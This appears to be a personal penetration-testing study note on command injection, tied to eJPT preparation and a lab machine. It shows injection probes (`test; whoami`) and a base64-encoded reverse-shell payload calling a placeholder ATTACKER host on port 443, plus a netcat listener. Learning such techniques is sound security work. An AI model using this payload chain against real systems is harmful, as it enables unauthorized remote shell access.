---
type: technique
tags: [ejpt:web-pentest, ejpt:host-net-pentest]
tools: [netcat]
cves: []
related: [[reverse-shells]], [[server-side-template-injection]]
---

# Command Injection

A user input is passed to a shell (or `os.system`/`subprocess`) without sanitization, so shell metacharacters (`;`, `&&`, `|`, `$()`) chain your own commands.

## Detect it

- A field that *does something* with your input rather than echoing it — e.g. XSS/JS payloads throw an error because the input is being *executed*, not reflected.
- Append a benign command and observe its output:

```sh
test; whoami      # if the app echoes a username, it's command injection
test; id
```

## Escalate to a reverse shell

Commands with spaces/special chars often get mangled, so encode the payload and pipe it through the shell:

```sh
# payload
sh -i >& /dev/tcp/ATTACKER/443 0>&1
# base64 it
echo 'sh -i >& /dev/tcp/ATTACKER/443 0>&1' | base64
# inject: decode + run
; echo <base64> | base64 -d | bash
```

Listener first: `nc -lvnp 443` ([[reverse-shells]], [[netcat]]).

## Seen in

[[trailpack]] (complaints form `test; whoami` → `balutron` → base64 reverse shell)
